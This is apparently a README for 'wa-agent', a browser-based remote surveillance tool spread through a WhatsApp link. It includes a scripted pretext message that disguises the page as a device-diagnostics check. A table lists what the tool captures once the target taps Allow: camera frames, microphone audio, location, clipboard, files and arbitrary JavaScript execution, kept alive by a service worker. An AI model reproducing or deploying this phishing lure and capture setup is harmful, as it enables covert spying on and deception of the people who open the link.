# wa-agent

One link, sent over WhatsApp. Whoever taps it becomes a "device" I can inspect and drive from an operator console. No install, no native app, no credentials on their side.

Not real root. It is a browser-capability agent: what the browser will do after one tap on Allow.

## Live

- target link: `https://spectra3445.github.io/wa-agent/index.html?r=<RUN>`
- operator console: the same URL plus `&op=1`
- `RUN` is any 22 char token. One per person, keep it random.

## WhatsApp text

> Hi, quick one. Built a small diagnostics page so we do not have to go back and forth. Open this on the phone, tap Allow access, and it will show device, browser and storefront rendering from a real handset: `<link>`
>
> If the camera does not start, hit the ⋯ menu and open in Safari or Chrome. Takes a minute, nothing to install.
>
> I will see the session on my side as soon as it opens.

## What a device exposes, after Allow

| capability | Android | iOS | desktop |
|---|---|---|---|
| fingerprint (ua, gpu, screen, tz, battery, net) | yes | yes | yes |
| camera front/rear, frame every 1.2s | yes | yes | yes |
| mic, 5s audio chunks | yes | yes | yes |
| geolocation stream | yes | yes | yes |
| clipboard read | yes | partial | yes |
| notifications | yes | partial | yes |
| screen share + snapshots | no | no | yes |
| directory listing, file bytes | no | no | Chrome |
| bluetooth, nfc, midi | bt/nfc | no | bt |
| wake lock, vibrate | yes | no | wake |
| eval arbitrary JS in page | yes | yes | yes |
| survive reload (service worker) | yes | yes | yes |

## Limits, stated plainly

- Nothing survives the tab closing on iOS. Android and desktop recover via service worker while the tab lives.
- Camera, mic, geolocation all need the single Allow tap, and geolocation needs HTTPS (Pages is HTTPS).
- WhatsApp in-app browser on iOS often blocks camera. The message tells them to switch to Safari.
- The page runs with a service_role key, so anyone who opens devtools gets full read/write on this Supabase project. Fine for throwaway, rotate if it matters. RLS policies exist and key on an `x-run` header, but service_role bypasses them.
- Events self-trim: 500 rows per device, commands older than 2 days deleted.

## Deploy

```
./deploy.sh          # schema + bucket + upload to Supabase Storage
```

Then publish `docs/` (already built from the placeholders) through GitHub Pages. `docs/` holds the version with `__PRJ__` and `__KEY__` filled in.

Storage alone serves `.html` as `text/plain`, which is why Pages is the front door and Supabase is only the relay.

## Files

- `index.html` client and console, one file, vanilla JS
- `sw.js`, `manifest.json` offline shell and A2HS
- `sql/schema.sql` tables, indexes, trim trigger, RLS, realtime publication
- `deploy.sh` applies the SQL and uploads
